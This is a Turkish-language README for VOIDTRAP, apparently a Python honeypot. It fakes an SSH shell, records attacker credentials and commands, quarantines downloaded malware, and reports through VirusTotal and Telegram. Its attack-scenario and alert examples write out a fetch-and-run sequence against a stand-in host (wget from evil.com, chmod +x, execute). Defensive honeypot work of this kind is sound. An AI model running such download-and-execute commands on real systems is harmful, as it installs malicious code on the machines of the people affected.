# 🕷️ VOIDTRAP - Advanced Honeypot & Deception System

```
██╗   ██╗ ██████╗ ██╗██████╗ ████████╗██████╗  █████╗ ██████╗ 
██║   ██║██╔═══██╗██║██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗
██║   ██║██║   ██║██║██║  ██║   ██║   ██████╔╝███████║██████╔╝
╚██╗ ██╔╝██║   ██║██║██║  ██║   ██║   ██╔══██╗██╔══██║██╔═══╝ 
 ╚████╔╝ ╚██████╔╝██║██████╔╝   ██║   ██║  ██║██║  ██║██║     
  ╚═══╝   ╚═════╝ ╚═╝╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     
        >> Cyber Deception & Intelligence System <<
```

## 📋 Genel Bakış

**VOIDTRAP**, saldırganları yakalamak, davranışlarını analiz etmek ve kötü niyetli yazılımları toplamak için tasarlanmış gelişmiş bir honeypot (bal küpü) sistemidir. SSH benzeri bir ortam simüle ederek saldırganların komutlarını kaydeder, kötü amaçlı yazılım indirmelerini izler ve VirusTotal entegrasyonu ile analiz yapar.

## ✨ Özellikler

### 🎭 Deception (Aldatma)
- **Fake SSH Terminal**: Gerçekçi SSH oturum simülasyonu
- **Sahte Dosya Sistemi**: `ls`, `pwd`, `whoami` gibi temel komutları taklit eder
- **Gerçek Zamanlı İzleme**: Tüm saldırgan aktivitelerini kaydeder

### 🔍 Intelligence (İstihbarat)
- **IP Geolocation**: Saldırganın coğrafi konumunu tespit eder (ip-api.com)
- **Komut Geçmişi**: Saldırganların çalıştırdığı tüm komutları loglar
- **Credential Harvesting**: Kullanılan kullanıcı adı ve şifreleri kaydeder

### ☣️ Malware Collection (Kötü Yazılım Toplama)
- **Otomatik İndirme**: `wget` ve `curl` komutlarıyla yapılan indirmeleri yakalar
- **Karantina Sistemi**: İndirilen dosyaları güvenli bir dizine kaydeder
- **Hash Analizi**: MD5 hash hesaplama ve VirusTotal kontrolü

### 📡 Notification & Alerting (Bildirim Sistemi)
- **Telegram Entegrasyonu**: Gerçek zamanlı bildirimler
  - Saldırı girişimleri
  - Komut geçmişi
  - Kötü yazılım indirmeleri
- **VirusTotal API**: İndirilen dosyaların otomatik analizi

### 🛡️ Security (Güvenlik)
- **Config Management**: JSON tabanlı yapılandırma sistemi
- **Nuke Protocol**: Tüm hassas verileri temizleme özelliği
- **Asenkron İşleme**: Queue tabanlı bildirim sistemi

## 🚀 Kurulum

### Gereksinimler
```bash
Python 3.7+
```

### 1. Bağımlılıkları Yükleyin
```bash
pip install -r requirements.txt
```

### 2. İlk Çalıştırma
```bash
# Varsayılan ayarlarla başlat (Port 2222)
sudo python3 main.py

# Özel port ile başlat
sudo python3 main.py --port 8022
```

> **⚠️ Not**: 1024'ün altındaki portlar için `sudo` gereklidir.

## ⚙️ Yapılandırma

### Komut Satırı Argümanları

#### Temel Ayarlar
```bash
--port, -p         # Dinlenecek port (varsayılan: 2222)
--nuke, -n         # Tüm ayarları ve tokenleri sil
```

#### Telegram Yapılandırması
```bash
--telegram, -tg           # Telegram modülünü aktifleştir
--tg-token, -tt TOKEN     # Telegram Bot Token
--tg-chat, -tci CHAT_ID   # Telegram Chat ID
```

**Örnek:**
```bash
sudo python3 main.py --telegram --tg-token "YOUR_BOT_TOKEN" --tg-chat "YOUR_CHAT_ID"
```

#### VirusTotal Yapılandırması
```bash
--virustotal, -vtm     # VirusTotal modülünü aktifleştir
--vt-key, -vt API_KEY  # VirusTotal API Key
```

**Örnek:**
```bash
sudo python3 main.py --virustotal --vt-key "YOUR_VT_API_KEY"
```

### Yapılandırma Dosyası (void_config.json)

İlk çalıştırmadan sonra otomatik oluşturulur:

```json
{
    "HONEYPOT": {
        "BIND_IP": "0.0.0.0",
        "BIND_PORT": 2222,
        "LOG_FILE": "voidtrap.log",
        "QUARANTINE_DIR": "quarantine"
    },
    "TELEGRAM": {
        "ENABLED": false,
        "TOKEN": "",
        "CHAT_ID": ""
    },
    "VIRUSTOTAL": {
        "ENABLED": false,
        "API_KEY": ""
    }
}
```

## 📊 Kullanım Örnekleri

### Basit Kullanım
```bash
# Varsayılan ayarlarla başlat
sudo python3 main.py
```

### Telegram Bildirimleri ile
```bash
sudo python3 main.py \
  --port 2222 \
  --telegram \
  --tg-token "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11" \
  --tg-chat "987654321"
```

### Tam Özellikli Kullanım
```bash
sudo python3 main.py \
  --port 2222 \
  --telegram \
  --tg-token "YOUR_TOKEN" \
  --tg-chat "YOUR_CHAT_ID" \
  --virustotal \
  --vt-key "YOUR_VT_API_KEY"
```

### Yapılandırmayı Temizleme
```bash
# ⚠️ DİKKAT: Bu komut tüm ayarları siler!
python3 main.py --nuke
```

## 🎯 Saldırı Senaryosu Örneği

1. **Saldırgan bağlanır:**
   ```
   telnet your-server 2222
   ```

2. **Sahte login ekranı:**
   ```
   Ubuntu 22.04 LTS
   Login: attacker
   Password: ********
   ```

3. **Saldırgan komutlar çalıştırır:**
   ```bash
   whoami
   ls
   wget http://evil.com/malware.sh
   chmod +x malware.sh
   ./malware.sh
   ```

4. **VOIDTRAP'in tepkisi:**
   - ✅ Tüm komutları kaydeder
   - ✅ `malware.sh` dosyasını indirir ve karantinaya alır
   - ✅ MD5 hash hesaplar
   - ✅ VirusTotal'de kontrol eder
   - ✅ Telegram'a bildirim gönderir

## 📱 Telegram Bildirimleri

### Bildirim Türleri

#### 1. Saldırı Girişimi
```
🔓 INTRUSION
🌍 IP: 192.168.1.100 - Turkey (TR)
👤 U: root
🔑 P: admin123
```

#### 2. Komut Geçmişi
```
🕵️‍♂️ SESSION LOG
🌍 IP: 192.168.1.100
📜 CMD:
> whoami
> ls -la
> wget http://evil.com/malware.sh
```

#### 3. Kötü Yazılım Yakalandı
```
☣️ VOIDTRAP ALERT ☣️
🌍 IP: 192.168.1.100
🔗 URL: http://evil.com/malware.sh
📁 File: malware.sh
#️⃣ MD5: a1b2c3d4e5f6...
📊 VT: 🔥 45/70 Malicious
```

## 📝 Log Formatı

Loglar JSON formatında `voidtrap.log` dosyasına kaydedilir:

```json
{
  "ip": "192.168.1.100",
  "u": "root",
  "p": "password123",
  "loc": "Turkey (TR)"
}
```

## 🔒 Güvenlik Önerileri

1. **İzolasyon**: Honeypot'u production sistemlerden ayrı bir ağda çalıştırın
2. **Firewall**: Gereksiz outbound bağlantıları engelleyin
3. **Monitoring**: Düzenli olarak logları kontrol edin
4. **Updates**: Bağımlılıkları güncel tutun
5. **Secrets**: API anahtarlarını güvenli şekilde saklayın

## 🛠️ Proje Yapısı

```
Honey.py/
├── main.py              # Ana uygulama
├── requirements.txt     # Python bağımlılıkları
├── README.md            # Bu dosya
├── void_config.json     # Yapılandırma (çalıştırmadan sonra)
├── voidtrap.log         # Aktivite logları
└── quarantine/          # Yakalanan kötü yazılımlar
```

## 🔧 Teknik Detaylar

### Desteklenen Komutlar
- `ls` - Sahte dizin listesi
- `pwd` - Çalışma dizini (/root)
- `whoami` - Kullanıcı adı (root)
- `wget` / `curl` - URL'den indirme (yakalanır)
- `exit` - Oturumu kapat

### API Entegrasyonları
- **ip-api.com**: IP geolocation (ücretsiz)
- **VirusTotal API v3**: Dosya analizi (API key gerekli)
- **Telegram Bot API**: Bildirimler (Bot token gerekli)

### Thread Yapısı
- **Ana Thread**: Socket dinleme
- **Client Threads**: Her bağlantı için ayrı thread
- **Worker Thread**: Asenkron bildirim gönderimi

## 🐛 Bilinen Sınırlamalar

- Sadece temel SSH simülasyonu (gerçek SSH değil)
- Sınırlı komut seti desteği
- IPv4 desteği (IPv6 henüz yok)
- Tek bir port üzerinde dinleme

## 🤝 Katkıda Bulunma

Bu proje eğitim amaçlıdır. Geliştirme önerileri:
- Daha fazla komut desteği
- Docker container desteği
- Web dashboard
- Multi-port support
- SSH key authentication simülasyonu

## ⚖️ Yasal Uyarı

Bu araç **sadece eğitim ve yasal siber güvenlik araştırmaları** için tasarlanmıştır. Kendi ağınızda ve sahip olduğunuz sistemlerde kullanın. İzinsiz kullanım yasa dışıdır.

## 📄 Lisans

Bu proje eğitim amaçlı geliştirilmiştir. Ticari kullanım için geliştirici ile iletişime geçin.

## 🔗 Faydalı Linkler

- [VirusTotal API](https://developers.virustotal.com/reference/overview)
- [Telegram Bot API](https://core.telegram.org/bots/api)
- [OWASP Honeypot Guide](https://owasp.org/www-community/Honeypots)

---

**⚠️ Uyarı**: Bu honeypot gerçek kötü amaçlı yazılımları toplar. Yeterli izolasyon ve güvenlik önlemleri alınmadan production ortamında kullanmayın!

Made with 🕷️ by macallantheroot
